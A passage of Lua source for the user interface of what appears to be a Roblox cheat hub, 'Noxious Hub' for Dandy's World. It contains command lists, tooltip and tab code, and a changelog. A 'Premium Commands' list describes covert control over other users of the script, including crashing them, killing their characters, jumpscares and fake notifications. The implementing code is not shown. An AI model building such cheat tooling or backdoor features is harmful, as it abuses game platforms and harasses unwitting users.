		" ",
		"cheer - makes you cheer",
		"enableclickcheer, eccheer - enables click to cheer",
		"disableclickcheer, dccheer - disables click to cheer",
		" ",
		"dive - makes you dive",
		"enableclickdive, ecdive - enables click to dive",
		"disableclickdive, dcdive - disables click to dive"
	},
	["Scripts"]={
		"bacondwscript, bacon - opens Bac0nH1ckOff's dandy's world script",
		"gobbydwscript, gobby - opens G0bbyD0llan57's dandy's world script",
		"spooksdwscript, spooks - opens ApparentlySpooks' dandy's world script",
		"moxdwscript, mox - opens ApparentlySpooks & Mox's dandy's world script",
		"hexdwscript, hex - opens Hex233222's dandy's world script",
		"yiwdwscript, yiw - opens Yiw's dandy's world script",
		"(KEY) bobbydwscript, bobby - opens bob junior's dandy's world script",
		"otvajnidwscript, otvajni - opens Otvajni's dandy's world script",
		"(KEY) rodestrikerdwscript, rodestriker - opens Rode Striker's dandy's world script",
		"soupdwscript, soup - opens Soup's dandy's world script",
		"(KEY) ffjdwscript, ffj - opens FFJ's dandy's world script",
		"poltergeistscript, pg - opens jaonoobao's dandy's world script",
		" ",
		"oldnoxious, oldnxs - opens old Noxious Hub: Dandy's World",
		" ",
		"(KEY) otvajniflyscript, otvajnifly - opens Otvajni's fly script",
		"mobilekeyboard, mk - opens RED_BLOXZ's mobile keyboard script",
		"infiniteyield, iy - opens Edge's infinite yield",
		"explorer, dex - opens Dark Dex",
	},
	["Premium Commands"] = {
		"scriptnotifiergui, sngui - opens script notifier gui",
		"scriptnotify, sn [text] - notifies people with the script with the specifed text",
		" ",
		"scriptfakeunablenotify, sfun - fake notifies people with the scirpt that unable joined",
		"scriptfakeacenotify, sfan - fake notifies people with the scirpt that ace joined",
		"scriptfakeqwelvernotify, sfqn - fake notifies people with the scirpt that qwelver joined",
		"scriptfaketeammembernotify, sftmn - fake notifies people with the scirpt that a noxious team member joined",
		" ",
		"scriptforcestoprunningconnections, sfsrc - forces people with the script to stop running connections",
		"scriptforcestopplayerinteractions, sfspi - forces people with the script to stop player interactions",
		" ",
		"scriptteleport, stp - teleports people with the script to you",
		"scriptforcesingthickofit, sfstoi - forces people with the script to sing thick of it",
		"scriptkill, skill - sets everyone with the script's character's health to 0",
		"scriptcrash, scrash - crashes everyone with the script",
		" ",
		"scriptunabledecalspam, suds - decal spams people with the script with unable",
		"scriptshrimpodecalspam, ssods - decal spams people with the script with shrimpo",
		"scriptnoxiousdecalspam, snds - decal spams people with the script with the noxious icon",
		"scriptscarydecalspam, ssyds - decal spams people with the script with a scary face??? idk",
		"scriptveryscarydecalspam, svsyds - decal spams people with the script with a scary face",
		" ",
		"scriptcreepygirlvoice, scgv - plays a creepy girl voice audio to people with the script",
		"scriptmancrying, smc - plays a man crying audio to people with the script",
		"scriptwomancrying, swc - plays a woman crying audio to people with the script",
		" ",
		"jumpscaregui, jsgui - opens jumpscare gui",
		"scriptdandyjumpscare, sdjs - jumpscares people with the script with dandy",
		"scriptsharingandandyjumpscare, ssdjs - jumpscares people with the script with sharingan dandy",
		"scriptshrimpojumpscare, ssojs - jumpscares people with the script with shrimpo",
		"scriptalbertjumpscare, sajs - jumpscares people with the script with albert",
		"scriptconniejumpscare, scjs - jumpscares people with the script with connie",
		"scriptfruitcakejumpscare, sfcjs - jumpscares people with the script with sprout x cosmo",
		"scriptjewelryboxjumpscare, sjbjs - jumpscares people with the script with glisten x boxten",
		"scriptbuffpebblejumpscare, sbpjs - jumpscares people with the script with buff pebble",
		"scripttoodlesjumpscare, stjs - jumpscares people with the script with toodles",
		"scriptshellyjumpscare, ssyjs - jumpscares people with the script with shelly",
		"scriptshrimpo2jumpscare, sso2js - jumpscares people with the script with shrimpo 2",
		"scriptsproutjumpscare, ssts - jumpscares people with the script with sprout",
		"scriptscaryfacejumpscare, ssfjs - jumpscares people with the script with a scary face",
		" ",
		"scriptflashbang, sfb - flashbangs people with the script",
	}

}

commandstates = commandstates or {}

noxious["command lists"] = noxious["command lists"] or {}
noxious["command lists"]["Favorited Commands"] = noxious["command lists"]["Favorited Commands"] or {}

local favoritedcommandsfilepath = "DSWDNoxiousFavoritedCmds.txt"
local favoritedcommandstatesfilepath = "DSWDNoxiousFavoritedCmdStates.txt"

function deletefile(filename)
	if isfile(filename) then
		delfile(filename)
	end
end

function loadfavoritedcommands()
	if not isfile(favoritedcommandsfilepath) then
		writefile(favoritedcommandsfilepath, "")
	end

	if isfile(favoritedcommandsfilepath) then
		local fileContent = readfile(favoritedcommandsfilepath)
		for command in fileContent:gmatch('"([^"]+)"') do
			table.insert(noxious["command lists"]["Favorited Commands"], command)
		end
	else
		noxious["command lists"]["Favorited Commands"] = {}
	end
end

function savefavoritedcommands()
	local fileContent = ""
	for _, command in ipairs(noxious["command lists"]["Favorited Commands"]) do
		fileContent = fileContent .. ('"%s",\n'):format(command)
	end
	writefile(favoritedcommandsfilepath, fileContent)
end

function loadfavoritedcommandstates()
	if not isfile(favoritedcommandstatesfilepath) then
		writefile(favoritedcommandstatesfilepath, "")
	end

	if isfile(favoritedcommandstatesfilepath) then
		local fileContent = readfile(favoritedcommandstatesfilepath)
		for command, state in fileContent:gmatch('"([^"]+)":([01]),') do
			commandstates[command] = state == "1"
		end
	else
		commandstates = {}
	end
end

function savefavoritedcommandstates()
	local fileContent = ""
	for command, state in pairs(commandstates) do
		fileContent = fileContent .. ('"%s":%s,\n'):format(command, state and "1" or "0")
	end
	writefile(favoritedcommandstatesfilepath, fileContent)
end

spawn(function()
	if game.PlaceId ~= noxious["test game"] then
		deletefile("DSWDNoxiousPinnedCommands.txt")
		deletefile("DSWDFavoritedPinnedCommands.txt")
		deletefile("DSWDFavoritedCommandStates.txt")
	end
end)

spawn(function()
	if game.PlaceId ~= noxious["test game"] then
		loadfavoritedcommands()
		loadfavoritedcommandstates()
	end
end)

-------------------------------------------------------------------------------------------------------------------------------

noxious["introduction"] = Instance.new"TextLabel"
noxious["introduction"].Size = UDim2.new(0, 333.3, 0, 204)
noxious["introduction"].Position = UDim2.new(1, -333.5, 0, 80)
noxious["introduction"].TextColor3 = noxious["default white color"]
noxious["introduction"].BorderColor3 = noxious["default white color"]
noxious["introduction"].BackgroundTransparency = 1
noxious["introduction"].Font = Enum.Font.Nunito
noxious["introduction"].Name = "Introduction"
noxious["introduction"].TextSize = 21.6
noxious["introduction"].Text = "Thanks for using our script!\n\nPress a button on the left to get started.\n\nSwitch to the ''Changelogs'' tab to view the\nupdate logs.\n\nCurrent version: ".. noxious["version"]
noxious["introduction"].TextWrapped = true
noxious["introduction"].TextXAlignment = Enum.TextXAlignment.Center
noxious["introduction"].TextYAlignment = Enum.TextYAlignment.Center
noxious["introduction"].Parent = mainframe

noxious["tooltip main frame"] = Instance.new"Frame"
noxious["tooltip main frame"].Name = "tooltip"
noxious["tooltip main frame"].Size = UDim2.new(0, 265, 0, 55)
noxious["tooltip main frame"].BackgroundTransparency = 1
noxious["tooltip main frame"].BackgroundColor3 = noxious["default black color"]
noxious["tooltip main frame"].BorderSizePixel = 0
noxious["tooltip main frame"].ZIndex = 999920
noxious["tooltip main frame"].Visible = false
noxious["tooltip main frame"].Parent = mainframe

noxious["tooltip command name"] = Instance.new"TextLabel"
noxious["tooltip command name"].Name = "CommandName"
noxious["tooltip command name"].Size = UDim2.new(1.1, 0, 0.67, 0)
noxious["tooltip command name"].Position = UDim2.new(0, -5, 0, -55)
noxious["tooltip command name"].BackgroundTransparency = 0
noxious["tooltip command name"].BackgroundColor3 = noxious["default black color"]
noxious["tooltip command name"].TextColor3 = noxious["default white color"]
noxious["tooltip command name"].Font = Enum.Font.Nunito
noxious["tooltip command name"].TextSize = 16
noxious["tooltip command name"].ZIndex = 999920
noxious["tooltip command name"].TextScaled = false
noxious["tooltip command name"].TextWrapped = true
noxious["tooltip command name"].BorderSizePixel = 1
noxious["tooltip command name"].BorderColor3 = noxious["default white color"]
noxious["tooltip command name"].TextXAlignment = Enum.TextXAlignment.Center
noxious["tooltip command name"].TextYAlignment = Enum.TextYAlignment.Center
noxious["tooltip command name"].Parent = noxious["tooltip main frame"]
noxious["tooltip command name"].ZIndex = 2

noxious["tooltip command description"] = Instance.new"TextLabel"
noxious["tooltip command description"].Name = "Description"
noxious["tooltip command description"].Size = UDim2.new(1.1, 0, 1.92, 0)
noxious["tooltip command description"].Position = UDim2.new(0, -5, -0.43, -10)
noxious["tooltip command description"].BackgroundTransparency = 0.2
noxious["tooltip command description"].BackgroundColor3 = noxious["default black color"]
noxious["tooltip command description"].TextColor3 = noxious["default white color"]
noxious["tooltip command description"].Font = Enum.Font.Nunito
noxious["tooltip command description"].TextSize = 16
noxious["tooltip command description"].ZIndex = 999920
noxious["tooltip command description"].TextScaled = false
noxious["tooltip command description"].TextWrapped = true
noxious["tooltip command description"].BorderSizePixel = 1
noxious["tooltip command description"].BorderColor3 = noxious["default white color"]
noxious["tooltip command description"].TextXAlignment = Enum.TextXAlignment.Center
noxious["tooltip command description"].TextYAlignment = Enum.TextYAlignment.Center
noxious["tooltip command description"].Parent = noxious["tooltip main frame"]
noxious["tooltip command description"].ZIndex = 1

local padding = Instance.new"UIPadding"
padding.PaddingLeft = UDim.new(0, 13)
padding.PaddingRight = UDim.new(0, 13)
padding.Parent = noxious["tooltip command description"]

function updatetooltipSize(commandName, description)
	local totalHeight = 40
	local fixedWidth = 310

	noxious["tooltip command name"].Text = commandName
	noxious["tooltip command description"].Text = description

	noxious["tooltip main frame"].Size = UDim2.new(0, fixedWidth, 0, totalHeight)
end

local hoverDebounce = false
local currentHoverCommand 

function displayCommands(commandList)
	for _, child in ipairs(mainframe:GetChildren()) do
		if child:IsA"TextLabel" and child.Name == "List of commands" then
			child:Destroy()
		elseif child:IsA"TextLabel" and child.Name == "Introduction" then
			child:Destroy()
		elseif child:IsA"TextLabel" and child.Name == "HoverToView" then
			child:Destroy()
		elseif child:IsA"ScrollingFrame" and child.Name == "CommandScrollFrame" then
			child:Destroy()
		end
	end

	local listtitle = Instance.new"TextLabel"
	listtitle.Name = "List of commands"
	listtitle.Size = UDim2.new(0, 323.3, 0, 39.6)
	listtitle.Position = UDim2.new(1, -166.1, 0, 73.5)
	listtitle.AnchorPoint = Vector2.new(0.5, 0)
	listtitle.BackgroundTransparency = 1
	listtitle.TextColor3 = noxious["default white color"]
	listtitle.Font = Enum.Font.Nunito
	listtitle.TextSize = 21
	listtitle.BorderSizePixel = 1
	listtitle.BorderColor3 = noxious["default white color"]
	listtitle.TextScaled = false
	listtitle.Text = "▼ List of commands ▼"
	listtitle.Parent = mainframe

	local listtitle2 = Instance.new"TextLabel"
	listtitle2.Name = "HoverToView"
	listtitle2.Size = UDim2.new(0, 290.4, 0, 39.6)
	listtitle2.Position = UDim2.new(1, -166.5, 0, 91)
	listtitle2.AnchorPoint = Vector2.new(0.5, 0)
	listtitle2.BackgroundTransparency = 1
	listtitle2.TextColor3 = noxious["default white color"]
	listtitle2.Font = Enum.Font.Nunito
	listtitle2.TextSize = 15
	listtitle2.BorderSizePixel = 1
	listtitle2.BorderColor3 = noxious["default white color"]
	listtitle2.TextScaled = false
	listtitle2.Text = "Hover over a command to view its info."
	listtitle2.Parent = mainframe

	local commandscrollframe = Instance.new"ScrollingFrame"
	commandscrollframe.Name = "CommandScrollFrame"
	commandscrollframe.Size = UDim2.new(0, 333, 0, 164.4)
	commandscrollframe.Position = UDim2.new(1, -333, 0, 120)
	commandscrollframe.CanvasSize = UDim2.new(0, 0, #commandList * 0, 0)
	commandscrollframe.ScrollBarThickness = 10
	commandscrollframe.BackgroundTransparency = 1
	commandscrollframe.BorderColor3 = noxious["default white color"]
	commandscrollframe.BorderSizePixel = 0
	commandscrollframe.ZIndex = 18
	commandscrollframe.Parent = mainframe
	commandscrollframe.ScrollingDirection = Enum.ScrollingDirection.Y
	commandscrollframe.ScrollBarImageTransparency = 0
	commandscrollframe.ZIndex = 1

	local commandpadding = Instance.new"UIPadding"
	commandpadding.PaddingLeft = UDim.new(0, 8)
	commandpadding.Parent = commandscrollframe

	local itemHeight = 15
	local spacing = 1
	local totalHeight = (#commandList * itemHeight) + (#commandList - 1) * spacing

	for i, commandText in ipairs(commandList) do
		if commandText:match("^%s*$") then
			local commandtext = Instance.new("TextButton")
			commandtext.Size = UDim2.new(1, 0, 0, itemHeight * 1.1)
			commandtext.Position = UDim2.new(0, 0, 0, (i - 1) * (itemHeight + spacing))
			commandtext.BackgroundTransparency = 1
			commandtext.TextColor3 = noxious["default white color"]
			commandtext.Font = Enum.Font.Nunito
			commandtext.TextSize = 17
			commandtext.TextScaled = false
			commandtext.Text = commandText
			commandtext.BorderSizePixel = 0
			commandtext.TextXAlignment = Enum.TextXAlignment.Left
			commandtext.Parent = commandscrollframe
		else
			local container = Instance.new("Frame")
			container.Size = UDim2.new(1, 0, 0, itemHeight * 1.1)
			container.Position = UDim2.new(0, 0, 0, (i - 1) * (itemHeight + spacing))
			container.BackgroundTransparency = 1
			container.Parent = commandscrollframe
			container.ZIndex = 2

			local imageButton = Instance.new("ImageButton")
			imageButton.Name = "ToggleButton"
			imageButton.Size = UDim2.new(0, 16, 0, 16)
			imageButton.Position = UDim2.new(0, -3.5, 0.5, 0.5)
			imageButton.AnchorPoint = Vector2.new(0, 0.5)
			imageButton.BackgroundTransparency = 1
			imageButton.Image = commandstates[commandText] and "rbxassetid://84270520426892" or "rbxassetid://110183128911099"
			imageButton.Parent = container
			imageButton.ImageColor3 = noxious["default white color"]
			imageButton.ZIndex = 3

			local commandtext = Instance.new("TextButton")
			commandtext.Size = UDim2.new(1, -20, 1, 0)
			commandtext.Position = UDim2.new(0, 17, 0, 0)
			commandtext.BackgroundTransparency = 1
			commandtext.TextColor3 = noxious["default white color"]
			commandtext.Font = Enum.Font.Nunito
			commandtext.TextSize = 17
			commandtext.TextScaled = false
			commandtext.Text = commandText
			commandtext.BorderSizePixel = 0
			commandtext.TextXAlignment = Enum.TextXAlignment.Left
			commandtext.Parent = container
			commandtext.ZIndex = 3

			imageButton.MouseButton1Click:Connect(function()
				noxious["click sound"]:Play()
				commandstates[commandText] = not commandstates[commandText]
				imageButton.Image = commandstates[commandText] and "rbxassetid://84270520426892" or "rbxassetid://110183128911099"

				if commandstates[commandText] then
					if not table.find(noxious["command lists"]["Favorited Commands"], commandText) then
						table.insert(noxious["command lists"]["Favorited Commands"], commandText)
					end
				else
					local index = table.find(noxious["command lists"]["Favorited Commands"], commandText)
					if index then
						table.remove(noxious["command lists"]["Favorited Commands"], index)
					end
				end

				savefavoritedcommandstates()
				savefavoritedcommands()
			end)

			commandtext.MouseButton1Click:Connect(function()
				noxious["click sound"]:Play()

				local commandText = commandtext.Text
				local commandName

				commandName = commandText:match("^(.-),")

				if not commandName then
					commandName = commandText:match("^(.-)%s*%[")
				end

				if not commandName then
					commandName = commandText:match("^(.-)%s*%-")
				end

				commandName = commandName or commandText

				commandName = commandName:gsub("%(P%) ", ""):gsub("%s+$", "")
				commandName = commandName:gsub("%(HP%) ", ""):gsub("%s+$", "")
				commandName = commandName:gsub("%(KEY%) ", ""):gsub("%s+$", "")

				noxious["command bar"].Text = commandName
			end)

			commandtext.MouseEnter:Connect(function()
				if not hoverDebounce and commandText and commandText:match"^%s*$" == nil then
					hoverDebounce = true
					currentHoverCommand = commandtext

					local namePart, descriptionPart = commandText:match"^(.-)%s*%-%s*(.*)$"
					namePart = namePart or commandText
					descriptionPart = descriptionPart or ""

					updatetooltipSize(namePart, descriptionPart)

					local mousePosition = noxious["user input service"]:GetMouseLocation()
					noxious["tooltip main frame"].Position = UDim2.new(0, mousePosition.X - mainframe.AbsolutePosition.X - (noxious["tooltip main frame"].Size.X.Offset / 2), 0, mousePosition.Y - mainframe.AbsolutePosition.Y - noxious["tooltip main frame"].Size.Y.Offset)
					noxious["tooltip main frame"].Visible = true

					task.delay(0.05, function()
						hoverDebounce = false
					end)
				end
			end)

			commandtext.MouseLeave:Connect(function()
				if currentHoverCommand == commandtext then
					noxious["tooltip main frame"].Visible = false
					currentHoverCommand = nil
				end
			end)
		end
	end

	commandscrollframe.CanvasSize = UDim2.new(0, 0, 0.017, totalHeight)

	noxious["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if noxious["tooltip main frame"].Visible then
				local mousePosition = input.Position
				noxious["tooltip main frame"].Position = UDim2.new(0, mousePosition.X - mainframe.AbsolutePosition.X - (noxious["tooltip main frame"].Size.X.Offset / 2), 0, mousePosition.Y - mainframe.AbsolutePosition.Y - noxious["tooltip main frame"].Size.Y.Offset - 30)
			end
		end
	end)
end

local isTouchDevice = noxious["user input service"].TouchEnabled

function updateTooltipPosition(mousePosition)
	noxious["tooltip main frame"].Position = UDim2.new(
		0,
		mousePosition.X - mainframe.AbsolutePosition.X - (noxious["tooltip main frame"].Size.X.Offset / 2),
		0,
		mousePosition.Y - mainframe.AbsolutePosition.Y - noxious["tooltip main frame"].Size.Y.Offset - 30
	)
end

if isTouchDevice then
	local isDragging = false

	noxious["user input service"].InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.Touch then
			isDragging = true

			if currentHoverCommand then
				updateTooltipPosition(input.Position)
				noxious["tooltip main frame"].Visible = true
			end
		end
	end)

	noxious["user input service"].InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.Touch then
			isDragging = false
			noxious["tooltip main frame"].Visible = false
		end
	end)

	noxious["user input service"].InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.Touch and isDragging then
			if currentHoverCommand then
				updateTooltipPosition(input.Position)
			end
		end
	end)
end

-------------------------------------------------------------------------------------------------------------------------------

local orderedButtonNames = {
	"Main",
	"Risky Commands",
	"Favorited Commands",
	"ESPs / Visuals",
	"Map / Environment",
	"Teleports",
	"Local Player",
	"Fun / Trolls",
	"Animations / Emotes",
	"Scripts",
}

if premiumuser(noxious["local player"].Name) then
	for i, name in ipairs(orderedButtonNames) do
		if name == "Risky Commands" then
			table.insert(orderedButtonNames, i + 2, "Premium Commands")
			break
		end
	end
end

if undercover(noxious["local player"].Name) then
	for i, name in ipairs(orderedButtonNames) do
		if name == "Risky Commands" then
			table.insert(orderedButtonNames, i + 2, "Premium Commands")
			break
		end
	end
end

-------------------------------------------------------------------------------------------------------------------------------

noxious["command button holder"] = Instance.new"ScrollingFrame"
noxious["command button holder"].Size = UDim2.new(0, 260.7, 0.9636, -101)
noxious["command button holder"].Position = UDim2.new(0, 0, 0, 74)
noxious["command button holder"].CanvasSize = UDim2.new(0, 0, 1.709, 0)
noxious["command button holder"].ScrollBarThickness = 12
noxious["command button holder"].BackgroundTransparency = 1
noxious["command button holder"].BorderSizePixel = 1
noxious["command button holder"].BorderColor3 = noxious["default white color"]
noxious["command button holder"].Parent = mainframe
noxious["command button holder"].ScrollingDirection = Enum.ScrollingDirection.Y
noxious["command button holder"].ScrollBarImageColor3 = noxious["default white color"]
noxious["command button holder"].ScrollBarImageTransparency = 0

if premiumuser(noxious["local player"].Name) then
	noxious["command button holder"].CanvasSize = UDim2.new(0, 0, 1.888, 0)
end

if undercover(noxious["local player"].Name) then
	noxious["command button holder"].CanvasSize = UDim2.new(0, 0, 1.888, 0)
end

-------------------------------------------------------------------------------------------------------------------------------

noxious["scroll bar holder"] = Instance.new"Frame"
noxious["scroll bar holder"].Size = UDim2.new(0, 12.100000000000001, 0, 242.00000000000003)
noxious["scroll bar holder"].BackgroundColor3 = noxious["default black color"]
noxious["scroll bar holder"].BorderSizePixel = 0
noxious["scroll bar holder"].Position = UDim2.new(0, 248, 0, 48)
noxious["scroll bar holder"].BorderColor3 = noxious["default white color"]
noxious["scroll bar holder"].BorderSizePixel = 1
noxious["scroll bar holder"].ZIndex = 1
noxious["scroll bar holder"].Parent = mainframe

-------------------------------------------------------------------------------------------------------------------------------

function updateButtonText(clickedButton)
	for _, button in ipairs(noxious["command button holder"]:GetChildren()) do
		if button:IsA"TextButton"then
			if button == clickedButton then
				if not button.Text:find"> " then
					button.Text = "> " .. button.Text .. " <"
				end
			else
				button.Text = button.Text:gsub("> ", ""):gsub(" <", "")
			end
		end
	end
end

local buttonCount = 0
for _, buttonName in ipairs(orderedButtonNames) do
	local commandList = noxious["command lists"][buttonName]

	local button = Instance.new"TextButton"	
	button.Size = UDim2.new(1.1, -55, 0, 45)
	button.Position = UDim2.new(0, 123.2, buttonCount * 0.0965, 37.4)
	button.AnchorPoint = Vector2.new(0.5, 0.5)
	button.BackgroundColor3 = noxious["default black color"]
	button.TextColor3 = noxious["default white color"]
	button.Text = buttonName
	button.BorderColor3 = noxious["default white color"]
	button.BorderSizePixel = 1
	button.ZIndex = 17
	button.Font = Enum.Font.Nunito
	button.TextSize = 19.2
	button.Parent = noxious["command button holder"]

	if premiumuser(noxious["local player"].Name) then
		button.Position = UDim2.new(0, 123.2, buttonCount * 0.0880, 37.4)
	end

	if undercover(noxious["local player"].Name) then
		button.Position = UDim2.new(0, 123.2, buttonCount * 0.0880, 37.4)
	end

	button.AutoButtonColor = true

	button.MouseButton1Click:Connect(function()
		noxious["click sound"]:Play()
		displayCommands(commandList)
		updateButtonText(button)
	end)

	buttonCount = buttonCount + 1
end

-------------------------------------------------------------------------------------------------------------------------------

noxious["tabs frame"] = Instance.new"Frame"
noxious["tabs frame"].Size = UDim2.new(0.9999, 0, 0, 26.4)
noxious["tabs frame"].Position = UDim2.new(0, 0, 0, 53)
noxious["tabs frame"].BackgroundColor3 = noxious["default black color"]
noxious["tabs frame"].BorderColor3 = noxious["default white color"]
noxious["tabs frame"].BorderSizePixel = 1
noxious["tabs frame"].Parent = noxious["top frame"]

-------------------------------------------------------------------------------------------------------------------------------

noxious["commands tab"] = Instance.new"TextButton"
noxious["commands tab"].Size = UDim2.new(0.25, 0, 0, 26.4)
noxious["commands tab"].Position = UDim2.new(0, 0, 0, 0)
noxious["commands tab"].BackgroundColor3 = noxious["default black color"]
noxious["commands tab"].BorderColor3 = noxious["default white color"]
noxious["commands tab"].BorderSizePixel = 1
noxious["commands tab"].Parent = noxious["tabs frame"]
noxious["commands tab"].TextColor3 = noxious["default white color"]
noxious["commands tab"].Font = Enum.Font.Nunito
noxious["commands tab"].TextSize = 20
noxious["commands tab"].TextScaled = false
noxious["commands tab"].Text = "> Commands <"
noxious["commands tab"].TextXAlignment = Enum.TextXAlignment.Center
noxious["commands tab"].TextYAlignment = Enum.TextYAlignment.Center

-------------------------------------------------------------------------------------------------------------------------------

noxious["changelogs tab"] = Instance.new"TextButton"
noxious["changelogs tab"].Size = UDim2.new(0.25, 0, 0, 26.4)
noxious["changelogs tab"].Position = UDim2.new(0.5, 0, 0, 0)
noxious["changelogs tab"].BackgroundColor3 = noxious["default black color"]
noxious["changelogs tab"].BorderColor3 = noxious["default white color"]
noxious["changelogs tab"].BorderSizePixel = 1
noxious["changelogs tab"].Parent = noxious["tabs frame"]
noxious["changelogs tab"].TextColor3 = noxious["default white color"]
noxious["changelogs tab"].Font = Enum.Font.Nunito
noxious["changelogs tab"].TextSize = 20
noxious["changelogs tab"].TextScaled = false
noxious["changelogs tab"].Text = "Changelogs"
noxious["changelogs tab"].TextXAlignment = Enum.TextXAlignment.Center
noxious["changelogs tab"].TextYAlignment = Enum.TextYAlignment.Center

-------------------------------------------------------------------------------------------------------------------------------

noxious["back to commands button"] = Instance.new"TextButton"
noxious["back to commands button"].Visible = false
noxious["back to commands button"].Size = UDim2.new(0, 156.3, 0, 36.3)
noxious["back to commands button"].Position = UDim2.new(0.013, 0, 0.1579, 0)
noxious["back to commands button"].BackgroundColor3 = noxious["default black color"]
noxious["back to commands button"].BorderColor3 = noxious["default white color"]
noxious["back to commands button"].BorderSizePixel = 1
noxious["back to commands button"].Parent = noxious["bottom frame"]
noxious["back to commands button"].TextColor3 = noxious["default white color"]
noxious["back to commands button"].Font = Enum.Font.Nunito
noxious["back to commands button"].TextSize = 20
noxious["back to commands button"].TextScaled = false
noxious["back to commands button"].Text = "Back to Commands"
noxious["back to commands button"].TextXAlignment = Enum.TextXAlignment.Center
noxious["back to commands button"].TextYAlignment = Enum.TextYAlignment.Center

-------------------------------------------------------------------------------------------------------------------------------

noxious["reload noxious button"] = Instance.new"TextButton"
noxious["reload noxious button"].Visible = false
noxious["reload noxious button"].Size = UDim2.new(0, 136.3, 0, 36.3)
noxious["reload noxious button"].Position = UDim2.new(0.292, 0, 0.1579, 0)
noxious["reload noxious button"].BackgroundColor3 = noxious["default black color"]
noxious["reload noxious button"].BorderColor3 = noxious["default white color"]
noxious["reload noxious button"].BorderSizePixel = 1
noxious["reload noxious button"].Parent = noxious["bottom frame"]
noxious["reload noxious button"].TextColor3 = noxious["default white color"]
noxious["reload noxious button"].Font = Enum.Font.Nunito
noxious["reload noxious button"].TextSize = 20
noxious["reload noxious button"].TextScaled = false
noxious["reload noxious button"].Text = "Reload Noxious"
noxious["reload noxious button"].TextXAlignment = Enum.TextXAlignment.Center
noxious["reload noxious button"].TextYAlignment = Enum.TextYAlignment.Center

-------------------------------------------------------------------------------------------------------------------------------

noxious["information tab"] = Instance.new"TextButton"
noxious["information tab"].Size = UDim2.new(0.25, 0, 0, 26.4)
noxious["information tab"].Position = UDim2.new(0.25, 0, 0, 0)
noxious["information tab"].BackgroundColor3 = noxious["default black color"]
noxious["information tab"].BorderColor3 = noxious["default white color"]
noxious["information tab"].BorderSizePixel = 1
noxious["information tab"].Parent = noxious["tabs frame"]
noxious["information tab"].TextColor3 = noxious["default white color"]
noxious["information tab"].Font = Enum.Font.Nunito
noxious["information tab"].TextSize = 20
noxious["information tab"].TextScaled = false
noxious["information tab"].Text = "Info"
noxious["information tab"].TextXAlignment = Enum.TextXAlignment.Center
noxious["information tab"].TextYAlignment = Enum.TextYAlignment.Center

-------------------------------------------------------------------------------------------------------------------------------

noxious["workspace.info button"] = Instance.new"TextButton"
noxious["workspace.info button"].Visible = false
noxious["workspace.info button"].Size = UDim2.new(0, 156.3, 0, 36.3)
noxious["workspace.info button"].Position = UDim2.new(0.013, 0, 0.1579, 0)
noxious["workspace.info button"].BackgroundColor3 = noxious["default black color"]
noxious["workspace.info button"].BorderColor3 = noxious["default white color"]
noxious["workspace.info button"].BorderSizePixel = 1
noxious["workspace.info button"].Parent = noxious["bottom frame"]
noxious["workspace.info button"].TextColor3 = noxious["default white color"]
noxious["workspace.info button"].Font = Enum.Font.Nunito
noxious["workspace.info button"].TextSize = 20
noxious["workspace.info button"].TextScaled = false
noxious["workspace.info button"].Text = "Workspace.Info"
noxious["workspace.info button"].TextXAlignment = Enum.TextXAlignment.Center
noxious["workspace.info button"].TextYAlignment = Enum.TextYAlignment.Center

-------------------------------------------------------------------------------------------------------------------------------

noxious["noxious info button"] = Instance.new"TextButton"
noxious["noxious info button"].Visible = false
noxious["noxious info button"].Size = UDim2.new(0, 136.3, 0, 36.3)
noxious["noxious info button"].Position = UDim2.new(0.292, 0, 0.1579, 0)
noxious["noxious info button"].BackgroundColor3 = noxious["default black color"]
noxious["noxious info button"].BorderColor3 = noxious["default white color"]
noxious["noxious info button"].BorderSizePixel = 1
noxious["noxious info button"].Parent = noxious["bottom frame"]
noxious["noxious info button"].TextColor3 = noxious["default white color"]
noxious["noxious info button"].Font = Enum.Font.Nunito
noxious["noxious info button"].TextSize = 20
noxious["noxious info button"].TextScaled = false
noxious["noxious info button"].Text = "> Noxious Info <"
noxious["noxious info button"].TextXAlignment = Enum.TextXAlignment.Center
noxious["noxious info button"].TextYAlignment = Enum.TextYAlignment.Center

-------------------------------------------------------------------------------------------------------------------------------

noxious["developer note button"] = Instance.new"TextButton"
noxious["developer note button"].Visible = false
noxious["developer note button"].Size = UDim2.new(0, 136.3, 0, 36.3)
noxious["developer note button"].Position = UDim2.new(0.292, 0, 0.1579, 0)
noxious["developer note button"].BackgroundColor3 = noxious["default black color"]
noxious["developer note button"].BorderColor3 = noxious["default white color"]
noxious["developer note button"].BorderSizePixel = 1
noxious["developer note button"].Parent = noxious["bottom frame"]
noxious["developer note button"].TextColor3 = noxious["default white color"]
noxious["developer note button"].Font = Enum.Font.Nunito
noxious["developer note button"].TextSize = 20
noxious["developer note button"].TextScaled = false
noxious["developer note button"].Text = "Developer Note"
noxious["developer note button"].TextXAlignment = Enum.TextXAlignment.Center
noxious["developer note button"].TextYAlignment = Enum.TextYAlignment.Center

-------------------------------------------------------------------------------------------------------------------------------

noxious["credits tab"] = Instance.new"TextButton"
noxious["credits tab"].Size = UDim2.new(0.25, 0, 0, 26.4)
noxious["credits tab"].Position = UDim2.new(0.75, 0, 0, 0)
noxious["credits tab"].BackgroundColor3 = noxious["default black color"]
noxious["credits tab"].BorderColor3 = noxious["default white color"]
noxious["credits tab"].BorderSizePixel = 1
noxious["credits tab"].Parent = noxious["tabs frame"]
noxious["credits tab"].TextColor3 = noxious["default white color"]
noxious["credits tab"].Font = Enum.Font.Nunito
noxious["credits tab"].TextSize = 20
noxious["credits tab"].TextScaled = false
noxious["credits tab"].Text = "Credits"
noxious["credits tab"].TextXAlignment = Enum.TextXAlignment.Center
noxious["credits tab"].TextYAlignment = Enum.TextYAlignment.Center

-------------------------------------------------------------------------------------------------------------------------------

noxious["changelogs"] = {
	"------------------------- What's new? (Test version " .. noxious["version"] .. "): -------------------------",
	" ",
	"UI changes:",
	"- Attempted to fix configuration changing requiring two inputs for mobile users.",
	"- Revamped the descriptions of some commands.",
	" ",
	"Command updates:",
	"- Added 10 'Local Player' commands. (enable / disable bassiemacro [delay],",
	"   noclipcamera, unantiskillcheck, unantipopups, minzoom [number], useblatantloadout,",
	"   usesemiblatantloadout, enable / disable itemaura2)",
	"- Added 3 'ESPs / Visuals' commands. (chat [text], fire [target],",
	"   unfire [target])",
	"- Adjusted a handful of command names.",
